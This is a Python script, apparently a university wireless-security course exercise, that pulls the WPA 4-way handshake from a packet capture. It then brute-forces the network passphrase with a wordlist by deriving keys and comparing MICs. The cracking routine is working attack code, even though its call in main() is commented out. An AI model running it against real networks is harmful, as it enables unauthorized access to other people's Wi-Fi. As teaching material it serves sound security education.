#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__ = "Abraham Rubinstein et Yann Lederrey. Modifié par David Pellissier et Michael Ruckstuhl"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__email__ = "abraham.rubinstein@heig-vd.ch"
__status__ = "Prototype"

import argparse
from binascii import b2a_hex, a2b_hex
from scapy.all import *
from scapy.contrib.wpa_eapol import WPA_key
from pbkdf2 import *


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


def get_association_info(packets):
    """
    Returns the SSID, AP_MAC and Client_MAC, which are extracted from the association request
    """
    for p in packets:
        if p.haslayer("Dot11AssoReq"):
            ssid = p.info
            ap_mac = a2b_hex(p.addr1.replace(':', ''))
            client_mac = a2b_hex(p.addr2.replace(':', ''))
            return ssid, ap_mac, client_mac

    raise Exception("Couldn't find WPA association")


def get_hand_shake(packets):
    """
    returns an array containing the 4-way handshake WPA_key layers
    """
    handshake = []
    for p in packets:
        if p.haslayer(WPA_key):
            handshake.append(p[WPA_key])

    if len(handshake) != 4:
        raise Exception("Couldn't find all 4 packets of the handshake")

    return handshake


def mic_bruteforce(A, B, ssid, data, mic_expected, wordlist):
    """
    Try to find a collision with the expected mic, using the wordlist.
    """

    with open(wordlist) as file1:

        mic_expected = b2a_hex(mic_expected)

        for passphrase in file1:

            passphrase = passphrase.strip()  # removes \n
            passphrase = str.encode(passphrase)

            # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
            pmk = pbkdf2(hashlib.sha1, passphrase, ssid, 4096, 32)

            # expand pmk to obtain PTK
            ptk = customPRF512(pmk, str.encode(A), B)

            # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
            mic = hmac.new(ptk[0:16], data, hashlib.sha1)
            mic_guess = bytes(mic.hexdigest(), "utf-8")[:-8]

            print(f"\r{passphrase.decode():20} = {mic_guess}          ", end="", flush=True)

            if mic_guess == mic_expected:
                print("")
                return passphrase.decode()
    print("")
    return None


def main(pcap_file, dictionary):
    # Read capture file -- it contains beacon, authentication, association, handshake and data
    wpa = rdpcap(pcap_file)

    # Important parameters for key derivation - most of them can be obtained from the pcap file
    ssid, ap_mac, client_mac = get_association_info(wpa)
    A = "Pairwise key expansion"  # this string is used in the pseudo-random function

    handshake = get_hand_shake(wpa)
    hs1 = handshake[0]
    hs2 = handshake[1]
    hs3 = handshake[2]
    hs4 = handshake[3]
    print(ssid)
    hs1.show2()
    # Authenticator and Supplicant Nonces
    a_nonce = hs1.nonce
    s_nonce = hs2.nonce

    # This is the MIC contained in the 4th frame of the 4-way handshake
    # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
    '''
    mic_to_test = hs4.wpa_key_mic

    B = min(ap_mac, client_mac) \
        + max(ap_mac, client_mac) \
        + min(a_nonce, s_nonce) \
        + max(a_nonce, s_nonce)  # used in pseudo-random function

    hs4.wpa_key_mic = ""  # set MIC bytes to 0
    data = bytes(hs4.underlayer)

    print("Values used to derivate keys:")
    print("SSID:        ", ssid)
    print("AP Mac:      ", b2a_hex(ap_mac))
    print("CLient Mac:  ", b2a_hex(client_mac))
    print("AP Nonce:    ", b2a_hex(a_nonce))
    print("Client Nonce:", b2a_hex(s_nonce))
    print("Data:        ", b2a_hex(data))

    # Bruteforce
    print("\nBruteforcing MIC")
    print("============================")
    print("Expected MIC:         ", b2a_hex(mic_to_test))
    passphrase = mic_bruteforce(A, B, ssid, data, mic_to_test, dictionary)

    if passphrase:
        print("Found passphrase:", passphrase)
    else:
        print("Couldn't find the passphrase with this word list.")
    '''

if __name__ == "__main__":

    default_wordlist = "wordlists/WiFi-WPA/probable-v2-wpa-top62.txt"  # https://github.com/Taknok/French-Wordlist
    pcap = "PMKID_handshake.pcap"
    main(pcap, default_wordlist)

    '''
    # just parsing arguments
    parser = argparse.ArgumentParser(
        description="Performs a dictionary-based bruteforce of the passphrase of a WPA handshake.",
        epilog="This script was developped as an exercise for the SWI course at HEIG-VD")
        
    parser.add_argument("pcap", help="Network capture containing the authentication + the 4-way handshake of a WPA connection.")
    parser.add_argument("-d", "--dictionary", default=default_wordlist, help="The dictionary to use for bruteforcing the key. By default, a french wordlist is used")
    args = parser.parse_args()
    main(args.pcap, args.dictionary)
    '''
